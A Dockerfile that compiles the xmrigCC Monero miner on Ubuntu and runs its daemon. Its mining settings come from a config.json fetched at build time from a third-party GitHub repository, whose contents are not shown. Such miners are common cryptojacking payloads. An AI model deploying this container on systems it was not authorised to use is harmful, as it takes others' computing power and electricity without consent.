#MAINTAINER d13g0 <d13g0@null.org>  
FROM ubuntu:latest  
  
RUN DEBIAN_FRONTEND=noninteractive \  
apt-get update && \  
apt-get install -y language-pack-en-base && \  
export LC_ALL=en_US.UTF-8 && \  
export LANG=en_US.UTF-8  
  
RUN DEBIAN_FRONTEND=noninteractive apt-get update && apt-get install -y
software-properties-common  
RUN DEBIAN_FRONTEND=noninteractive LC_ALL=en_US.UTF-8 add-apt-repository
ppa:jonathonf/gcc-7.1  
  
RUN DEBIAN_FRONTEND=noninteractive LC_ALL=en_US.UTF-8 \  
apt-get update && apt-get install -y \  
git \  
build-essential \  
cmake \  
wget \  
vim \  
libuv1-dev \  
libmicrohttpd-dev \  
gcc-7 \  
g++-7  
  
RUN git clone https://github.com/Bendr0id/xmrigCC.git && \  
cd xmrigCC && \  
cmake . -DCMAKE_C_COMPILER=gcc-7 -DCMAKE_CXX_COMPILER=g++-7
-DWITH_CC_SERVER=OFF -DWITH_HTTPD=OFF && \  
make  
RUN wget
https://raw.githubusercontent.com/percreator/xmrigdaemon/master/config.json -P
/xmrigCC/  
  
ENV LC_ALL en_US.UTF-8  
ENTRYPOINT ["/xmrigCC/xmrigDaemon"]  

